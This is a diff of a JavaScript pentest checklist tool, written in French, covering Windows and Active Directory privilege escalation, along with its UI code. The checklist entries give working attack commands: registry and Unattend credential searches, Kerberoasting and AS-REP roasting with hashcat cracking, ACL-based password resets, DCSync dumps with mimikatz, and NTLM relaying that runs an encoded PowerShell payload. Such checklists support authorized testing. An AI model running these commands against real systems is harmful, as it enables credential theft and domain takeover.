-                label: 'Abus des binaires auto-élevés',
-                description: 'Certains binaires Windows sont configurés pour s\'exécuter automatiquement avec des privilèges élevés. Si l\'utilisateur actuel a des droits d\'écriture sur ces binaires ou leurs dépendances, cela peut être exploité.',
-                checkCommand: '# Rechercher les binaires avec l\'attribut "AutoElevate" (peut nécessiter des outils spécifiques).',
-                exploitationCommand: '# Remplacer le binaire légitime par un binaire malveillant.',
-                links: [{ name: 'HackTricks (AutoElevate)', url: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#auto-elevate-binaries' }],
-                tips: 'Identifier les binaires dans des chemins inscriptibles par l\'utilisateur.',
-                tags: ['binaries', 'privileges']
-            }
-        ],
-        'Credentials': [
-             {
-                id: 'win-unattend',
-                label: 'Rechercher les fichiers Unattend.xml',
-                description: 'Chercher des fichiers de configuration d\'installation automatique (Unattend.xml, sysprep.xml) qui peuvent contenir des mots de passe en clair ou encodés.',
-                checkCommand: 'dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml',
-                exploitationCommand: '# Ouvrir le fichier trouvé et chercher les sections <Password> ou <Credentials>.\n# Tenter de décoder les mots de passe Base64.',
-                links: [{ name: 'HackTricks (Unattend)', url: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unattend-files' }],
-                tips: 'Les mots de passe peuvent être en Base64. Ces fichiers peuvent se trouver dans des répertoires temporaires ou de sauvegarde.',
-                tags: ['credentials', 'files', 'configuration']
-            },
-            {
-                id: 'win-registry-credentials',
-                label: 'Rechercher les informations d\'identification dans le Registre',
-                description: 'Certaines applications stockent des informations d\'identification (mots de passe, clés API) dans le Registre Windows.',
-                checkCommand: 'reg query HKLM /s /f "password" /t REG_SZ /e && reg query HKCU /s /f "password" /t REG_SZ /e',
-                exploitationCommand: '# Examiner les clés de registre trouvées pour des informations sensibles.',
-                links: [],
-                tips: 'Utiliser des outils comme RegRipper pour une analyse plus approfondie du Registre.',
-                tags: ['credentials', 'registry']
-            },
-            {
-                id: 'win-service-permissions',
-                label: 'Analyser les permissions des services',
-                description: 'Vérifier les permissions sur les services Windows. Un utilisateur avec des droits de modification sur un service peut potentiellement l\'utiliser pour exécuter du code avec des privilèges SYSTEM.',
-                checkCommand: 'sc qc <nom_du_service> && icacls "C:\\Program Files\\<chemin_du_service>\\<executable_du_service>.exe"',
-                exploitationCommand: '# Si l\'utilisateur a des droits de modification (WRITE) sur le binaire du service, le remplacer par un exécutable malveillant et redémarrer le service.\n# Si l\'utilisateur a des droits de modification de la configuration du service, changer le binaire à exécuter.',
-                links: [{ name: 'HackTricks (Service Permissions)', url: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#weak-service-permissions' }],
-                tips: 'Utiliser des outils comme AccessChk de Sysinternals pour analyser les permissions.',
-                tags: ['services', 'permissions']
-            },
-            {
-                id: 'win-alwayson-vpn-credentials',
-                label: 'Rechercher les informations d\'identification Always On VPN',
-                description: 'Les configurations Always On VPN peuvent stocker des informations d\'identification dans le Registre ou des fichiers de configuration.',
-                checkCommand: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\RasMan\\Config /s /f "Password" /t REG_SZ /e && dir /s /b C:\\ProgramData\\Microsoft\\Network\\Connections\\Pbk\\*.pbk',
-                exploitationCommand: '# Examiner les clés de registre et les fichiers .pbk pour des informations sensibles.',
-                links: [],
-                tips: 'Les mots de passe peuvent être encodés.',
-                tags: ['credentials', 'vpn', 'registry', 'files']
-            }
-        ],
-        'System Info': [
-            {
-                id: 'win-os-version',
-                label: 'Vérifier la version du système d\'exploitation',
-                description: 'Identifier la version de Windows et le niveau de patch pour rechercher des exploits spécifiques.',
-                checkCommand: 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix(es)"',
-                exploitationCommand: '# Rechercher des exploits locaux sur Exploit-DB ou via des outils comme Windows Exploit Suggester (WES).',
-                links: [{ name: 'Windows Exploit Suggester', url: 'https://github.com/bitsadmin/wesng' }, { name: 'Exploit-DB', url: 'https://www.exploit-db.com/' }],
-                tips: 'Comparer les hotfixes installés avec les CVE connues.',
-                tags: ['os', 'system', 'exploit']
-            },
-            {
-                id: 'win-environment-variables',
-                label: 'Examiner les variables d\'environnement',
-                description: 'Certaines variables d\'environnement peuvent révéler des informations sensibles ou des chemins potentiellement exploitables.',
-                checkCommand: 'set',
-                exploitationCommand: '# Rechercher des chemins non standard dans PATH qui pourraient être détournés.',
-                links: [],
-                tips: 'Faire attention aux chemins contenant des espaces (nécessitent des guillemets pour l\'exécution).',
-                tags: ['environment', 'configuration']
-            },
-            {
-                id: 'win-installed-applications',
-                label: 'Lister les applications installées',
-                description: 'Identifier les applications vulnérables ou mal configurées qui pourraient être exploitées pour une élévation de privilèges.',
-                checkCommand: 'wmic product get Name, Version',
-                exploitationCommand: '# Rechercher des vulnérabilités connues pour les versions spécifiques des applications installées.',
-                links: [],
-                tips: 'Se concentrer sur les applications avec des privilèges élevés ou celles qui s\'exécutent en tant que service.',
-                tags: ['applications', 'vulnerabilities']
-            }
-        ],
-        'Scheduled Tasks': [
-            {
-                id: 'win-scheduled-tasks',
-                label: 'Analyser les tâches planifiées',
-                description: 'Lister les tâches planifiées et vérifier les permissions associées. Si l\'utilisateur a des droits d\'écriture sur le binaire ou le script exécuté par une tâche avec des privilèges élevés, cela peut être exploité.',
-                checkCommand: 'schtasks /query /fo LIST /v',
-                exploitationCommand: '# Si l\'utilisateur a des droits de modification sur le fichier exécuté par une tâche privilégiée, le remplacer par un payload malveillant.',
-                links: [{ name: 'HackTricks (Scheduled Tasks)', url: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scheduled-tasks' }],
-                tips: 'Vérifier la colonne "Run As User" et les permissions du fichier exécuté.',
-                tags: ['scheduled tasks']
+                id: 'w_software_vulns',
+                label: 'Exploiting Software Vulnerabilities (Local)',
+                description: 'Rechercher les vulnérabilités dans les logiciels tiers installés qui ont des exploits locaux connus.',
+                checkCommand: 'wmic product get name, version\npowershell -c "Get-WmiObject -Class Win32_Product | Select Name, Version"\n# Utiliser des outils comme Seatbelt, WinPEAS',
+                exploitCommand: '# Utiliser searchsploit ou des bases de données de vulnérabilités:\nsearchsploit <nom_du_logiciel> <version> local privilege escalation',
+                tips: 'Moins fréquent que les misconfigurations, mais toujours possible.',
+                tags: ['software', 'vulnerability', 'exploit', 'searchsploit']
             }
         ]
     },
+
+    // ==========================================================
+    // ================= ACTIVE DIRECTORY =======================
+    // ==========================================================
     'Active Directory': {
-        'Kerberos': [
+        'Kerberos Attacks': [
             {
-                id: 'ad-kerberoasting',
+                id: 'ad_kerberoasting',
                 label: 'Kerberoasting',
-                description: 'Identifier les comptes utilisateurs (non-machine) configurés avec un SPN. Le hash Kerberos TGS pour ces comptes peut être demandé et cracké offline pour obtenir le mot de passe du compte de service.',
-                checkCommand: '# PowerShell (AD Module):\nGet-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName\n\n# Rubeus:\nRubeus.exe kerberoast /outfile:hashes.kerberoast',
-                exploitationCommand: '# Cracker le hash avec hashcat ou john:\nhashcat -m 13100 hashes.kerberoast /path/to/wordlist.txt',
-                links: [{ name: 'HackTricks (Kerberoasting)', url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoasting' }],
-                tips: 'Cibler les comptes de service avec des privilèges élevés. Utiliser des outils comme SharpHound pour identifier facilement les SPNs.',
-                tags: ['kerberos', 'ad', 'credentials', 'cracking']
+                description: 'Identifier les comptes utilisateurs de domaine configurés avec un Service Principal Name (SPN) et demander un ticket de service Kerberos (TGS) pour eux. Le hash du TGS peut être cracké hors ligne.',
+                checkCommand: '# PowerView:\nGetUserSPNs.ps1\n# Rubeus:\nRubeus.exe kerberoast /outfile:hashes.txt\n# Impacket:\nGetUserSPNs.py <DOMAIN>/<USER> -request -outputfile hashes.txt',
+                exploitCommand: '# Cracker les hashs (Mode 13100 pour Kerberos 5 TGS-REP etype 23):\nhashcat -m 13100 hashes.txt wordlist.txt\njohn --format=krb5tgs hashes.txt --wordlist=wordlist.txt',
+                tips: 'Cible les comptes de service. Les mots de passe faibles peuvent être rapidement découverts. Ne nécessite pas de privilèges élevés pour l\'énumération.',
+                links: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoasting'],
+                tags: ['ad', 'kerberos', 'kerberoasting', 'credentials', 'spn', 'hashcat', 'john', 'rubeus', 'impacket']
             },
             {
-                id: 'ad-asreproasting',
+                id: 'ad_asreproasting',
                 label: 'AS-REP Roasting',
-                description: 'Identifier les comptes utilisateurs pour lesquels l\'attribut "Do not require Kerberos preauthentication" est activé. Le hash Kerberos AS-REP (TGT) de ces comptes peut être demandé sans authentification préalable et cracké offline.',
-                checkCommand: '# PowerShell (AD Module):\nGet-ADUser -Filter {\'DontRequirePreAuth\' -eq $true} -Properties SamAccountName\n\n# Rubeus:\nRubeus.exe asreproast /outfile:hashes.asreproast /format:hashcat',
-                exploitationCommand: '# Cracker le hash avec hashcat ou john:\nhashcat -m 18200 hashes.asreproast /path/to/wordlist.txt\n# Utiliser Rubeus pour demander le TGT et l\'exporter.',
-                links: [{ name: 'HackTricks (AS-REP Roasting)', url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/as-rep-roasting' }],
-                tips: 'Souvent utile pour obtenir un premier accès si un compte utilisateur est vulnérable. Utiliser SharpHound pour visualiser ces relations.',
-                tags: ['kerberos', 'ad', 'credentials', 'cracking', 'preauth']
+                description: 'Identifier les comptes utilisateurs pour lesquels l\'attribut "Do not require Kerberos preauthentication" est activé. Leur hash (AS-REP) peut être obtenu sans mot de passe et cracké hors ligne.',
+                checkCommand: '# PowerView:\nGet-DomainUser -PreauthNotRequired -Verbose\n# Rubeus:\nRubeus.exe asreproast /domain:<DOMAIN> /format:hashcat /outfile:hashes.txt\n# Impacket:\nGetNPUsers.py <DOMAIN>/ -usersfile <users.txt> -format hashcat -outputfile hashes.txt -no-pass',
+                exploitCommand: '# Cracker les hashs (Mode 18200 pour Kerberos 5 AS-REP etype 23):\nhashcat -m 18200 hashes.txt wordlist.txt\njohn --format=krb5asrep hashes.txt --wordlist=wordlist.txt',
+                tips: 'Cible les comptes utilisateurs (pas les comptes de service). Moins courant que Kerberoasting.',
+                links: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/as-rep-roasting'],
+                tags: ['ad', 'kerberos', 'asreproasting', 'credentials', 'preauthentication', 'hashcat', 'john', 'rubeus', 'impacket']
             }
         ],
-        'ACLs & Permissions': [
-             {
-                id: 'ad-acls-genericall',
-                label: 'ACLs - GenericAll/WriteDACL sur Objets Privilégiés',
-                description: 'Rechercher si votre utilisateur actuel (ou un groupe auquel il appartient) possède des droits de modification étendus (GenericAll, WriteDACL, WriteOwner) sur des objets sensibles (comptes admin, groupes privilégiés, objets GPO, l\'objet Domain).',
-                checkCommand: '# BloodHound est l\'outil principal pour analyser les ACLs.\n# PowerView (Exemple pour le groupe Domain Admins):\nGet-ObjectAcl -ResolveGUIDs -Identity "Domain Admins"',
-                exploitationCommand: '# Si WriteDACL sur un groupe, s\'ajouter au groupe:\nAdd-ADGroupMember -Identity "Target Group" -Members "Your User"\n\n# Si GenericAll sur un utilisateur, reset son mot de passe:\nSet-ADAccountPassword -Identity "Target User" -NewPassword (ConvertTo-SecureString "NewP@ssw0rd1" -AsPlainText -Force) -Reset\n\n# Si WriteOwner sur un objet, en prendre possession et modifier les ACLs.',
-                links: [{ name: 'HackTricks (ACL Abuse)', url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse' }],
-                tips: 'Utiliser BloodHound pour visualiser les chemins d\'attaque basés sur les ACLs. Les droits WriteDACL et WriteOwner sont particulièrement critiques.',
-                tags: ['ad', 'acl', 'permissions', 'bloodhound', 'genericall', 'writedacl', 'writeowner']
+        'ACL & Permissions Abuse': [
+            {
+                id: 'ad_acl_abuse',
+                label: 'ACL Abuse (Generic)',
+                description: 'Analyser les Access Control Lists (ACLs) sur les objets AD (utilisateurs, groupes, GPOs, objets ordinateur) pour trouver des permissions dangereuses (GenericAll, GenericWrite, WriteDacl, WriteOwner, etc.) accordées à des utilisateurs/groupes contrôlés.',
+                checkCommand: '# BloodHound est l\'outil principal pour visualiser et requêter les ACLs.\n# PowerView:\nGet-ObjectAcl -SamAccountName <TargetUser> -ResolveGUIDs\nFind-InterestingDomainAcl -ResolveGUIDs\n# ACLScanner.ps1',
+                exploitCommand: '# Si GenericWrite sur un utilisateur:\nSet-DomainUserPassword <TargetUser> -Password <NewPassword>\n# Si WriteDacl sur un groupe:\nAdd-DomainGroupMember -Identity <TargetGroup> -Members <ControlledUser>\n# Si GenericAll sur un GPO:\n# Modifier le GPO pour exécuter un script malveillant',
+                tips: 'BloodHound simplifie grandement cette analyse complexe. Recherchez les chemins d\'attaque qu\'il identifie.',
+                links: ['https://bloodhound.readthedocs.io/', 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse'],
+                tags: ['ad', 'acl', 'permissions', 'bloodhound', 'powerview', 'genericall', 'genericwrite', 'writedacl']
             },
             {
-                id: 'ad-gpo-abuse',
-                label: 'Abus des GPOs (Group Policy Objects)',
-                description: 'Si un utilisateur a des droits de modification sur une GPO liée à une OU contenant des ordinateurs ou des utilisateurs cibles, il peut modifier la GPO pour exécuter des commandes arbitraires avec les privilèges SYSTEM sur ces machines ou dans le contexte de ces utilisateurs.',
-                checkCommand: '# BloodHound peut identifier les relations de contrôle sur les GPOs.\n# PowerShell (AD Module):\nGet-GPO -Name "Nom de la GPO" | Get-GPPermission -All',
-                exploitationCommand: '# Modifier une GPO pour créer une tâche planifiée qui exécute un payload malveillant sur les machines cibles (Computer Configuration -> Preferences -> Control Panel Settings -> Scheduled Tasks).\n# Modifier les scripts de démarrage (Computer Configuration -> Windows Settings -> Scripts (Startup/Shutdown)).',
-                links: [{ name: 'HackTricks (GPO Abuse)', url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/group-policy-objects-gpos-and-privilege-escalation' }],
-                tips: 'Les GPOs liées aux OUs de haut niveau (Domain Controllers) sont des cibles de grande valeur.',
-                tags: ['ad', 'gpo', 'permissions']
+                id: 'ad_gpo_abuse',
+                label: 'Group Policy Abuse (GPO)',
+                description: 'Identifier les GPOs modifiables par l\'utilisateur actuel qui s\'appliquent à des ordinateurs ou utilisateurs privilégiés. Permet d\'exécuter du code via les scripts de démarrage/logon, les tâches planifiées, etc.',
+                checkCommand: '# BloodHound: Chercher les GPOs modifiables.\n# PowerView:\nGet-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}\nFind-ModifiableGPOs',
+                exploitCommand: '# Utiliser les outils RSAT ou des scripts PowerShell pour modifier le GPO:\n# Ajouter un script de démarrage immédiat ou une tâche planifiée.',
+                tips: 'Nécessite souvent les outils RSAT ou des cmdlets AD spécifiques pour modifier les GPOs.',
+                links: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/gpo-abuse'],
+                tags: ['ad', 'gpo', 'permissions', 'acl', 'scripts', 'bloodhound', 'powerview']
+            },
+            {
+                id: 'ad_dcsync',
+                label: 'DCSync Abuse',
+                description: 'Vérifier si l\'utilisateur actuel (ou un groupe auquel il appartient) a les privilèges `DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All` sur le domaine, permettant d\'extraire tous les hashs NTLM du contrôleur de domaine.',
+                checkCommand: '# BloodHound: Chercher les utilisateurs avec droit DCSync.\n# PowerView:\nGet-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.ObjectType -match "replication"}\n# Ou tester directement:\nimpacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user <UserToDump>',
+                exploitCommand: '# Mimikatz:\nmimikatz # lsadump::dcsync /domain:<DOMAIN> /all /csv\n# Impacket:\nimpacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc',
+                tips: 'Privilège extrêmement puissant, généralement réservé aux Domain Admins ou aux comptes de service spécifiques.',
+                links: ['https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync'],
+                tags: ['ad', 'dcsync', 'replication', 'credentials', 'hash', 'ntlm', 'mimikatz', 'impacket', 'bloodhound']
             }
         ],
-        'Trusts': [
+        'Credential Relaying & Poisoning': [
             {
-                id: 'ad-trust-abuse',
-                label: 'Abus des relations d\'approbation (Trusts)',
-                description: 'Si un domaine Active Directory a des relations d\'approbation avec d\'autres domaines, il peut être possible d\'abuser de ces relations pour obtenir un accès privilégié dans le domaine actuel ou les domaines approuvés.',
-                checkCommand: '# PowerShell (AD Module):\nGet-ADTrust -Filter *',
-                exploitationCommand: '# Utiliser des outils comme Mimikatz (s4u, ptt) pour générer des tickets inter-domaines si des SID History sont présents ou si des vulnérabilités d\'approbation existent.',
-                links: [{ name: 'HackTricks (Trust Abuse)', url: 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/trusts-attacks' }],
-                tips: 'Identifier le type de relation d\'approbation (one-way, two-way, transitive, non-transitive).',
-                tags: ['ad', 'trusts', 'mimikatz']
+                id: 'ad_llmnr_nbtns_poisoning',
+                label: 'LLMNR/NBT-NS Poisoning & SMB Relay',
+                description: 'Écouter les requêtes LLMNR/NBT-NS sur le réseau, y répondre avec l\'IP de l\'attaquant, et relayer les authentifications NTLMv1/v2 reçues vers d\'autres machines (souvent pour exécuter du code via SMB).',
+                checkCommand: '# Vérifier si LLMNR/NBT-NS sont actifs sur le réseau (souvent le cas par défaut).',
+                exploitCommand: '# Outil: Responder + Ntlmrelayx\n# 1. Lancer Responder:\nresponder -I <interface> -wv\n# 2. Lancer Ntlmrelayx (pour relayer vers SMB et exécuter une commande):\nntlmrelayx.py -t smb://<TARGET_IP> -c "powershell -e <base64_payload>"',
+                tips: 'Fonctionne mieux si la signature SMB n\'est pas requise sur la cible. Peut capturer des hashs NetNTLMv2 si le relais échoue.',
+                links: ['https://book.hacktricks.xyz/windows-hardening/llmnr-nbt-ns-and-mdns-poisoning', 'https://book.hacktricks.xyz/windows-hardening/ntlm/ntlm-relay'],
+                tags: ['ad', 'llmnr', 'nbt-ns', 'poisoning', 'smb relay', 'ntlm relay', 'responder', 'ntlmrelayx', 'network']
+            },
+            {
+                id: 'ad_mitm6',
+                label: 'mitm6 (IPv6 Attack)',
+                description: 'Forcer les machines Windows à utiliser IPv6 et à s\'authentifier auprès du serveur DNS IPv6 de l\'attaquant, permettant de relayer ces authentifications.',
+                checkCommand: '# Vérifier si IPv6 est activé sur le réseau.',
+                exploitCommand: '# Outils: mitm6 + ntlmrelayx\n# 1. Lancer mitm6:\nmitm6 -d <DOMAIN>\n# 2. Lancer ntlmrelayx pour relayer vers LDAP(S) ou HTTP(S):\nntlmrelayx.py -6 -t ldaps://<DC_IP> -wh <WpadHostName> -l .',
+                tips: 'Permet souvent de relayer vers LDAP pour ajouter un ordinateur au domaine ou modifier des objets.',
+                links: ['https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/'],
+                tags: ['ad', 'ipv6', 'mitm6', 'ntlm relay', 'ldap relay', 'network']
+            }
+        ],
+        'Other Domain Techniques': [
+             {
+                id: 'ad_password_reuse',
+                label: 'Password Reuse (Local -> Domain)',
+                description: 'Tester les mots de passe locaux compromis (ex: via Mimikatz sur une machine jointe) contre des comptes de domaine.',
+                checkCommand: '# Nécessite des identifiants locaux compromis.',
+                exploitCommand: '# Utiliser CrackMapExec, Metasploit, etc. pour tester les identifiants:\ncrackmapexec smb <TARGET_SUBNET> -u <USER> -p <PASSWORD>\n# Ou via PowerShell:\n$cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\\<USER>", (ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force))\nInvoke-Command -ComputerName <TARGET_COMPUTER> -ScriptBlock { whoami } -Credential $cred',
+                tips: 'Très courant. Les utilisateurs réutilisent souvent leurs mots de passe.',
+                tags: ['ad', 'credentials', 'password reuse', 'crackmapexec']
+            },
+            {
+                id: 'ad_service_principal_abuse',
+                label: 'Service Principal Name (SPN) Scanning',
+                description: 'Scanner le domaine pour les SPNs enregistrés afin d\'identifier les services potentiels (SQL, HTTP, etc.) et les comptes associés, utiles pour Kerberoasting ou ciblage.',
+                checkCommand: '# PowerView:\nGet-NetUser -SPN | Select SamAccountName, ServicePrincipalName\nGet-NetComputer -SPN | Select DNSHostName, ServicePrincipalName\n# ldapsearch (Linux):\nldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w "<PASSWORD>" -b "DC=domain,DC=local" "servicePrincipalName=*" servicePrincipalName | grep servicePrincipalName',
+                tips: 'Aide à cartographier les services critiques du domaine.',
+                tags: ['ad', 'spn', 'kerberos', 'enumeration', 'powerview', 'ldapsearch']
             }
         ]
     }
-    // Ajouter d'autres OS si nécessaire, ex: 'macOS', 'Generic Unix'
 };
 
-document.addEventListener('DOMContentLoaded', () => {
-    console.log("Privesc Refactored Initializing...");
+// ==========================================================================
+// ==================== END CHECKLIST DEFINITION ============================
+// ==========================================================================
 
-    // Références DOM
+
+document.addEventListener('DOMContentLoaded', () => {
+    console.log("Privesc Cockpit v3 (Refactored) Initializing...");
+
+    // --- Références DOM ---
     const nodeSelect = document.getElementById('node-select');
-    const activeNodeInfo = document.getElementById('active-node-info');
+    const activeNodeInfoEl = document.getElementById('active-node-info');
     const checklistContainer = document.getElementById('checklist-container');
     const checklistPlaceholder = document.getElementById('checklist-placeholder');
     const checklistSearchInput = document.getElementById('checklist-search');
     const checklistFilterStatus = document.getElementById('checklist-filter-status');
     const checklistFilterTag = document.getElementById('checklist-filter-tag');
-    const applyFiltersBtn = document.getElementById('apply-checklist-filters');
+    const applyFiltersBtn = document.getElementById('apply-checklist-filters'); // Vérifiez cet ID dans privesc.html
     const checklistItemTemplate = document.getElementById('checklist-item-template');
 
-    // Variables d'état
+    // --- État Global ---
     let hostManagerData = null;
     let currentNodeId = null;
-    let checklistState = {}; // { nodeId: { itemId: { status: 'todo', notes: '' }, ... } }
+    let checklistState = {};
     let availableTags = new Set();
+    const HOST_MANAGER_STORAGE_KEY = 'pentestHostData_v2';
+    const CHECKLIST_STORAGE_KEY = 'privescChecklistState_v3_refactored';
 
     // --- Initialisation ---
-    async function initialize() {
-        console.log("Initializing Privesc Tool...");
+    function initialize() {
+        console.log("Initializing Privesc Cockpit v3...");
         loadHostManagerData();
-        populateNodeSelector();
-        loadChecklistStateFromStorage(); // Charger l'état global
-
-        // Écouteurs d'événements
-        nodeSelect.addEventListener('change', handleNodeSelection);
-        applyFiltersBtn.addEventListener('click', applyFilters);
-        checklistSearchInput.addEventListener('keyup', (event) => {
-             if (event.key === 'Enter') applyFilters();
-        });
-        // Utiliser la délégation d'événements pour les items de checklist
-        checklistContainer.addEventListener('change', handleChecklistInteraction);
-        checklistContainer.addEventListener('input', handleChecklistInteraction); // Pour les textareas
-        checklistContainer.addEventListener('click', handleChecklistInteraction); // Pour les boutons copier
-
-        console.log("Privesc Tool Initialized.");
+        loadChecklistStateFromStorage();
+        setupEventListeners();
+        populateTagFilter();
+        displayInitialView();
     }
 
-    // --- Chargement des Données HostManager ---
+    // --- Chargement des Données ---
     function loadHostManagerData() {
+        console.log(`Attempting to load data from HostManager (localStorage key: ${HOST_MANAGER_STORAGE_KEY})...`);
         try {
-            const storedData = localStorage.getItem('pentestHostData_v2');
+            const storedData = localStorage.getItem(HOST_MANAGER_STORAGE_KEY);
             if (storedData) {
                 hostManagerData = JSON.parse(storedData);
                 console.log("HostManager data loaded successfully:", hostManagerData);
+                populateNodeSelector();
             } else {
-                console.warn("No HostManager data found in localStorage.");
-                hostManagerData = { categories: {}, edges: [] }; // Initialiser vide
+                console.warn(`No HostManager data found in localStorage ('${HOST_MANAGER_STORAGE_KEY}').`);
+                hostManagerData = { categories: {}, edges: [] };
                 nodeSelect.innerHTML = '<option value="">Aucune donnée HostManager trouvée</option>';
+                nodeSelect.disabled = true;
             }
         } catch (error) {
             console.error("Error loading or parsing HostManager data:", error);
             hostManagerData = { categories: {}, edges: [] };
             nodeSelect.innerHTML = '<option value="">Erreur chargement données</option>';
-            activeNodeInfo.textContent = 'Erreur chargement données HostManager.';
-        }
-    }
-
-    // --- Peuplement du Sélecteur de Node ---
-    function populateNodeSelector() {
-        if (!hostManagerData || Object.keys(hostManagerData.categories).length === 0) {
-             nodeSelect.innerHTML = '<option value="">Aucun node défini dans HostManager</option>';
-             return;
-        }
-
-        nodeSelect.innerHTML = '<option value="">-- Sélectionner un Node --</option>';
-        let nodeCount = 0;
-        for (const categoryName in hostManagerData.categories) {
-            const category = hostManagerData.categories[categoryName];
-            if (category.hosts) {
-                for (const hostId in category.hosts) {
-                    const host = category.hosts[hostId];
-                    const option = document.createElement('option');
-                    option.value = hostId;
-                    // Afficher plus d'infos si disponibles
-                    let displayText = hostId;
-                    if (host.system) displayText += ` (${host.system})`;
-                    if (host.role) displayText += ` - ${host.role}`;
-                    option.textContent = displayText;
-                    option.dataset.category = categoryName; // Stocker la catégorie
-                    nodeSelect.appendChild(option);
-                    nodeCount++;
-                }
-            }
-        }
-        console.log(`Populated node selector with ${nodeCount} nodes.`);
-    }
-
-    // --- Sélection d'un Node ---
-    function handleNodeSelection() {
-        currentNodeId = nodeSelect.value;
-        if (!currentNodeId) {
-            activeNodeInfo.textContent = 'Sélectionnez un node...';
-            checklistContainer.innerHTML = ''; // Vider la checklist
+            nodeSelect.disabled = true;
+            checklistPlaceholder.textContent = "Erreur lors du chargement des données depuis HostManager.";
             checklistPlaceholder.style.display = 'block';
-            return;
-        }
-
-        const selectedOption = nodeSelect.options[nodeSelect.selectedIndex];
-        const categoryName = selectedOption.dataset.category;
-        const nodeData = hostManagerData?.categories?.[categoryName]?.hosts?.[currentNodeId];
-
-        if (!nodeData) {
-            console.error(`Node data not found for ID: ${currentNodeId} in category: ${categoryName}`);
-            activeNodeInfo.textContent = `Erreur: Données introuvables pour ${currentNodeId}`;
-            checklistContainer.innerHTML = '';
-            checklistPlaceholder.textContent = `Erreur: Données introuvables pour ${currentNodeId}`;
-            checklistPlaceholder.style.display = 'block';
-            return;
-        }
-
-        console.log(`Node selected: ${currentNodeId}`, nodeData);
-        updateActiveNodeInfo(nodeData);
-        renderChecklistForNode(nodeData);
-        applyFilters(); // Appliquer les filtres actuels à la nouvelle checklist
-    }
-
-    // --- Mise à jour Infos Node Actif ---
-    function updateActiveNodeInfo(nodeData) {
-        let info = `OS: ${nodeData.system || 'N/A'} | `;
-        info += `Rôle: ${nodeData.role || 'N/A'} | `;
-        info += `Zone: ${nodeData.zone || 'N/A'} | `;
-        info += `Compromission: ${nodeData.compromiseLevel || 'None'} | `;
-        info += `Tags: ${(nodeData.tags || []).join(', ') || 'Aucun'}`;
-        activeNodeInfo.textContent = info;
-    }
-
-    // --- Rendu de la Checklist ---
-    function renderChecklistForNode(nodeData) {
-        checklistContainer.innerHTML = ''; // Vider l'ancien contenu
-        checklistPlaceholder.style.display = 'none';
-        availableTags.clear(); // Réinitialiser les tags pour ce node
-
-        const os = detectOS(nodeData.system); // Fonction à affiner
-        const definitionForOS = CHECKLIST_DEFINITION[os];
-
-        if (!definitionForOS) {
-            checklistPlaceholder.textContent = `Aucune checklist définie pour l'OS détecté: ${os || 'Inconnu'}`;
-            checklistPlaceholder.style.display = 'block';
-            populateTagFilter(); // Mettre à jour le filtre de tags (vide)
-            return;
-        }
-
-        let itemsRendered = 0;
-        for (const category in definitionForOS) {
-            // Optionnel: Ajouter un titre de catégorie
-            // const categoryTitle = document.createElement('h5');
-            // categoryTitle.textContent = category;
-            // categoryTitle.classList.add('mt-3', 'mb-2', 'text-primary');
-            // checklistContainer.appendChild(categoryTitle);
-
-            definitionForOS[category].forEach(item => {
-                const itemElement = createChecklistItemElement(item, nodeData);
-                checklistContainer.appendChild(itemElement);
-                itemsRendered++;
-                // Collecter les tags
-                (item.tags || []).forEach(tag => availableTags.add(tag));
-            });
-        }
-
-        if (itemsRendered === 0) {
-             checklistPlaceholder.textContent = `Aucun item de checklist trouvé pour l'OS: ${os}`;
-             checklistPlaceholder.style.display = 'block';
-        }
-
-        populateTagFilter(); // Mettre à jour le filtre de tags
-        loadChecklistStateForNode(currentNodeId); // Charger l'état spécifique à ce node
-        console.log(`Rendered ${itemsRendered} checklist items for node ${currentNodeId} (OS: ${os})`);
-    }
-
-    // --- Création d'un Élément de Checklist (depuis Template) ---
-    function createChecklistItemElement(itemData, nodeData) {
-        const templateClone = checklistItemTemplate.content.cloneNode(true);
-        const itemElement = templateClone.querySelector('.checklist-item');
-
-        itemElement.dataset.itemId = itemData.id;
-        itemElement.dataset.tags = (itemData.tags || []).join(',');
-
-        itemElement.querySelector('.checklist-label').textContent = itemData.label;
-        itemElement.querySelector('.checklist-description').textContent = itemData.description;
-
-        // Commandes
-        const checkCmdElement = itemElement.querySelector('.check-command code');
-        const checkCmdContainer = itemElement.querySelector('.check-command');
-        if (itemData.checkCommand) {
-            checkCmdElement.textContent = itemData.checkCommand;
-            checkCmdContainer.style.display = 'block';
-        } else {
-             checkCmdContainer.style.display = 'none';
-        }
-
-        const exploitCmdElement = itemElement.querySelector('.exploit-command code');
-        const exploitCmdContainer = itemElement.querySelector('.exploit-command');
-        if (itemData.exploitationCommand) {
-            exploitCmdElement.textContent = itemData.exploitationCommand;
-            exploitCmdContainer.style.display = 'block';
-        } else {
-            exploitCmdContainer.style.display = 'none';
-        }
-
-        // Liens
-        const linksContainer = itemElement.querySelector('.checklist-links');
-        if (itemData.links && itemData.links.length > 0) {
-            const linksList = document.createElement('p');
-            itemData.links.forEach(link => {
